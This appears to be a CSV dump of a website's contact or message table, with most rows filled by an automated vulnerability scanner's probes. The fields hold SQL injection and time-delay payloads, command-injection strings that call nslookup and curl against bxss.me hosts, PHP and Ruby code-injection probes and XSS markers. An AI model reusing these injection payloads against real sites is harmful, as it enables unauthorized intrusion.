id,Title,linkren,phone,mobile,fax,email,content,date,address,state,statedate,prodid
6959,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,-1 OR 2+948-948-1=0+0+0+1  ,0,,0
6960,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street9283189,0,,0
6961,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,"+A.concat(70-3).concat(22*4).concat(119).concat(69).concat(122).concat(70)+(requiresocket
Socket.gethostbyname(hitzb+shumvykxbb5d8.bxss.me.)[3].to_s)+",0,,0
6962,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,HttP://bxss.me/t/xss.html?%00,2025-11-11 00:00:00,3137 Laguna Street,0,,0
6963,Mr.,HfjNUlYZ,555-666-0606,&quot;,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
6964,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,&amp;(nslookup -q=cname hittvgqwdvfqfdd495.bxss.me||curl hittvgqwdvfqfdd495.bxss.me)&amp;\&quot;`0&amp;(nslookup -q=cname hittvgqwdvfqfdd495.bxss.me||curl hittvgqwdvfqfdd495.bxss.me)&amp;`,2025-11-11 00:00:00,3137 Laguna Street,0,,0
6965,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,.print(md5(31337)).,2025-11-11 00:00:00,3137 Laguna Street,0,,0
6966,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com&quot;&amp;&amp;sleep(27*1000)*srnyvw&amp;&amp;&quot;,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
6967,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,-1 OR 2+837-837-1=0+0+0+1,0,,0
6968,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555&quot;()&amp;%zzzScRiPt toeZ(9180)/ScRiPt,2025-11-11 00:00:00,3137 Laguna Street,0,,0
6969,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,"A.concat(70-3).concat(22*4).concat(122).concat(78).concat(122).concat(71)+(requiresocket
Socket.gethostbyname(hitlt+qsjoqypv94933.bxss.me.)[3].to_s)",0,,0
6970,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,bxss.me/t/xss.html?%00,2025-11-11 00:00:00,3137 Laguna Street,0,,0
6971,Mr.,HfjNUlYZ,555-666-0606,!—,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
6972,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,|(nslookup -q=cname hitxofqvgnvama076a.bxss.me||curl hitxofqvgnvama076a.bxss.me),2025-11-11 00:00:00,3137 Laguna Street,0,,0
6973,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,ÿassert(base64_decode(cHJpbnQobWQ1KDMxMzM3KSk7))ÿ,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
6974,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com||sleep(27*1000)*mcnbnv||,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
6975,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,-1 OR 2+69-69-1=0+0+0+1  ,0,,0
6976,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,&quot;()&amp;%zzzScRiPt toeZ(9839)/ScRiPt,2025-11-11 00:00:00,3137 Laguna Street,0,,0
6977,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,"&quot;+&quot;A&quot;.concat(70-3).concat(22*4).concat(106).concat(74).concat(110).concat(67)+(require&quot;socket&quot;
Socket.gethostbyname(&quot;hitks&quot;+&quot;lmsaauqv7405f.bxss.me.&quot;)[3].to_s)+&quot;",2025-11-11 00:00:00,3137 Laguna Street,0,,0
6978,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,HttP://bxss.me/t/xss.html?%00,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
6979,Mr.,&quot;,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
6980,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,`(nslookup -q=cname hityvxjhlycgr03e75.bxss.me||curl hityvxjhlycgr03e75.bxss.me)`,2025-11-11 00:00:00,3137 Laguna Street,0,,0
6981,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,ÿprint(md5(31337))ÿ$a=,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
6982,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com&quot;||sleep(27*1000)*qtuygl||&quot;,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
6983,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,-1 OR 2+484-484-1=0+0+0+1 or vj7PrVKv=,0,,0
6984,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,5559293159,2025-11-11 00:00:00,3137 Laguna Street,0,,0
6985,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,"+A.concat(70-3).concat(22*4).concat(120).concat(79).concat(111).concat(69)+(requiresocket
Socket.gethostbyname(hitkb+dhvmbcbn0f3d7.bxss.me.)[3].to_s)+",2025-11-11 00:00:00,3137 Laguna Street,0,,0
6986,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,bxss.me/t/xss.html?%00,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
6987,Mr.,!—,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
6988,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,&quot;ÿprint(md5(31337))ÿ$a=&quot;,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
6989,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
6990,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,-1&quot; OR 2+35-35-1=0+0+0+1  ,0,,0
6991,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com&quot;()&amp;%zzzScRiPt toeZ(9222)/ScRiPt,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
6992,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,ÿ(nslookup -q=cname hitgjdyyebkvo62006.bxss.me||curl hitgjdyyebkvo62006.bxss.me)|(nslookup -q=cname hitgjdyyebkvo62006.bxss.me||curl hitgjdyyebkvo62006.bxss.me)&amp;(nslookup -q=cname hitgjdyyebkvo62006.bxss.me||curl hitgjdyyebkvo62006.bxss.me),2025-11-11 00:00:00,3137 Laguna Street,0,,0
6993,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,"A.concat(70-3).concat(22*4).concat(107).concat(68).concat(122).concat(72)+(requiresocket
Socket.gethostbyname(hittp+oljaazdpd0ad4.bxss.me.)[3].to_s)",2025-11-11 00:00:00,3137 Laguna Street,0,,0
6994,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,HttP://bxss.me/t/xss.html?%00,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
6995,Mr.,HfjNUlYZ,&quot;,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
6996,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,${@print(md5(31337))},555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
6997,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
6998,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,"if(now()=sysdate(),sleep(15),0)",0,,0
6999,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,&quot;()&amp;%zzzScRiPt toeZ(9759)/ScRiPt,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7000,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,|(nslookup${IFS}-q${IFS}cname${IFS}hittjohbmzwgfe62bc.bxss.me||curl${IFS}hittjohbmzwgfe62bc.bxss.me),2025-11-11 00:00:00,3137 Laguna Street,0,,0
7002,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,bxss.me/t/xss.html?%00,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7003,Mr.,HfjNUlYZ,!—,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7004,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,${@print(md5(31337))}\,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7005,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7006,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,"3137 Laguna Street0XOR(if(now()=sysdate(),sleep(15),0))XORZ",0,,0
7007,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com9027482,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7008,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,&amp;(nslookup${IFS}-q${IFS}cname${IFS}hitrgjlqdiswa64fbb.bxss.me||curl${IFS}hitrgjlqdiswa64fbb.bxss.me)&amp;\&quot;`0&amp;(nslookup${IFS}-q${IFS}cname${IFS}hitrgjlqdiswa64fbb.bxss.me||curl${IFS}hitrgjlqdiswa64fbb.bxss.me)&amp;`,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7010,Mr.,HfjNUlYZ,555-666-0606,HttP://bxss.me/t/xss.html?%00,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7011,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,.print(md5(31337)).,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7012,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7013,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,"3137 Laguna Street0&quot;XOR(if(now()=sysdate(),sleep(15),0))XOR&quot;Z",0,,0
7014,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137&quot;()&amp;%zzzScRiPt toeZ(9352)/ScRiPt,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7017,Mr.,HfjNUlYZ,555-666-0606,bxss.me/t/xss.html?%00,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7018,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,ÿassert(base64_decode(cHJpbnQobWQ1KDMxMzM3KSk7))ÿ,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7019,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7020,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,&quot;()&amp;%zzzScRiPt toeZ(9525)/ScRiPt,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7023,Mr.,HttP://bxss.me/t/xss.html?%00,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7024,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,ÿprint(md5(31337))ÿ$a=,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7025,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,&quot;(),testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7026,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-31379144234,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7028,Mr.,bxss.me/t/xss.html?%00,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7029,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,(select(0)from(select(sleep(15)))v)/*+(select(0)from(select(sleep(15)))v)+&quot;+(select(0)from(select(sleep(15)))v)+&quot;*/,0,,0
7030,prodMsg.asp,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7031,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,&quot;ÿprint(md5(31337))ÿ$a=&quot;,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7032,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137&amp;&amp;sleep(27*1000)*npnntv&amp;&amp;,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7033,Mr.,HfjNUlYZ,555-666-0606,987-65-4329&quot;()&amp;%zzzScRiPt toeZ(9532)/ScRiPt,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7036,Mr.,HfjNUlYZ,HttP://bxss.me/t/xss.html?%00,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7037,prodMsg.asp,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7038,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,${@print(md5(31337))},testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7039,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137&quot;&amp;&amp;sleep(27*1000)*rohxts&amp;&amp;&quot;,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7040,Mr.,HfjNUlYZ,555-666-0606,&quot;()&amp;%zzzScRiPt toeZ(9443)/ScRiPt,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7042,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street-1； waitfor delay 0:0:15 —,0,,0
7043,prodMsg.asp/.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7044,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,${@print(md5(31337))}\,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7046,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137||sleep(27*1000)*cdtfdn||,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7047,Mr.,HfjNUlYZ,bxss.me/t/xss.html?%00,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7048,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,(nslookup -q=cname hitnyfxbcgeon904c3.bxss.me||curl hitnyfxbcgeon904c3.bxss.me)),555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7049,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,prodMsg.asp,0,,0
7050,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,.print(md5(31337)).,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7051,Mr.,HfjNUlYZ,555-666-0606,987-65-43299819413,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7052,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137&quot;||sleep(27*1000)*vavfgi||&quot;,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7053,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,$(nslookup -q=cname hitxkxmecipaz4c85e.bxss.me||curl hitxkxmecipaz4c85e.bxss.me),555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7054,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street-1)； waitfor delay 0:0:15 —,0,,0
7056,Mr.,HfjNUlYZ,555-666-0606,ÿassert(base64_decode(cHJpbnQobWQ1KDMxMzM3KSk7))ÿ,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7057,Mr.,HfjNUlYZ&quot;()&amp;%zzzScRiPt toeZ(9615)/ScRiPt,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7058,Mr.,HfjNUlYZ,555-666-0606,,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7060,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,prodMsg.asp,0,,0
7062,Mr.,HfjNUlYZ,555-666-0606,ÿprint(md5(31337))ÿ$a=,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7063,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7065,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,prodMsg.asp/.,0,,0
7066,Mr.,HfjNUlYZ,555-666-0606,&quot;ÿprint(md5(31337))ÿ$a=&quot;,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7067,Mr.,&quot;()&amp;%zzzScRiPt toeZ(9733)/ScRiPt,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7068,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street-1 waitfor delay 0:0:15 —,0,,0
7069,Mr.,HfjNUlYZ,555-666-0606,,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7071,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,prodMsg.asp,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7072,Mr.,HfjNUlYZ9856638,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7073,Mr.,HfjNUlYZ,555-666-0606,,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7074,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,prodMsg.asp,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7075,Mr.,HfjNUlYZ,555-666-0606,${@print(md5(31337))},317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7076,Mr.,HfjNUlYZ,555-666-0606&quot;()&amp;%zzzScRiPt toeZ(9645)/ScRiPt,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7077,Mr.,HfjNUlYZ,555-666-0606,&quot;(),317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7078,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,prodMsg.asp/.,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7079,Mr.,HfjNUlYZ,555-666-0606,${@print(md5(31337))}\,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7080,Mr.,HfjNUlYZ,&quot;()&amp;%zzzScRiPt toeZ(9310)/ScRiPt,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7081,Mr.,HfjNUlYZ,555-666-0606,987-65-4329&amp;&amp;sleep(27*1000)*axntod&amp;&amp;,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7082,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,|(nslookup -q=cname hitoawvbbxuzg761b1.bxss.me||curl hitoawvbbxuzg761b1.bxss.me),555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7083,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,prodMsg.asp,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7084,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street0g7JVCN3； waitfor delay 0:0:15 —,0,,0
7085,Mr.,HfjNUlYZ,555-666-0606,.print(md5(31337)).,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7086,Mr.,HfjNUlYZ,555-666-06069119142,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7087,Mr.,HfjNUlYZ,555-666-0606,987-65-4329&quot;&amp;&amp;sleep(27*1000)*odsqtz&amp;&amp;&quot;,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7088,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,`(nslookup -q=cname hitpupqsuuybg56295.bxss.me||curl hitpupqsuuybg56295.bxss.me)`,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7090,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,prodMsg.asp,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7091,Mr.,ÿassert(base64_decode(cHJpbnQobWQ1KDMxMzM3KSk7))ÿ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7092,Mr.,HfjNUlYZ,555-666-0606,987-65-4329||sleep(27*1000)*rtjkqu||,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7095,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,prodMsg.asp/.,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7096,Mr.,ÿprint(md5(31337))ÿ$a=,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7097,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna StreetWnDoAxVM)； waitfor delay 0:0:15 —,0,,0
7098,Mr.,HfjNUlYZ,555-666-0606,987-65-4329&quot;||sleep(27*1000)*oefnjb||&quot;,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7099,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,|(nslookup${IFS}-q${IFS}cname${IFS}hiteiwrgyewpm37a0b.bxss.me||curl${IFS}hiteiwrgyewpm37a0b.bxss.me),555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7101,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,prodMsg.asp,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7102,Mr.,&quot;ÿprint(md5(31337))ÿ$a=&quot;,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7105,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,prodMsg.asp,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7106,Mr.,${@print(md5(31337))},555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7109,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,prodMsg.asp/.,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7110,Mr.,${@print(md5(31337))}\,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7111,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7113,Mr.,HfjNUlYZ,555-666-0606,prodMsg.asp,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7114,Mr.,.print(md5(31337)).,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7116,Mr.,HfjNUlYZ,555-666-0606,prodMsg.asp,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7117,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Streetyk3RqwUs))； waitfor delay 0:0:15 —,0,,0
7118,Mr.,HfjNUlYZ,ÿassert(base64_decode(cHJpbnQobWQ1KDMxMzM3KSk7))ÿ,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7119,Mr.,&quot;(),555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7121,Mr.,HfjNUlYZ,555-666-0606,prodMsg.asp/.,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7122,Mr.,HfjNUlYZ,ÿprint(md5(31337))ÿ$a=,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7123,Mr.,HfjNUlYZ&amp;&amp;sleep(27*1000)*zzsymc&amp;&amp;,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7125,Mr.,prodMsg.asp,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7126,Mr.,HfjNUlYZ,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street64QcUDHP OR 583=(SELECT 583 FROM PG_SLEEP(15))—,0,,0
7127,Mr.,HfjNUlYZ,&quot;ÿprint(md5(31337))ÿ$a=&quot;,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7129,Mr.,prodMsg.asp,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7130,Mr.,HfjNUlYZ,${@print(md5(31337))},987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
7131,Mr.,HfjNUlYZ&quot;&amp;&amp;sleep(27*1000)*hccdie&amp;&amp;&quot;,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2025-11-11 00:00:00,3137 Laguna Street,0,,0
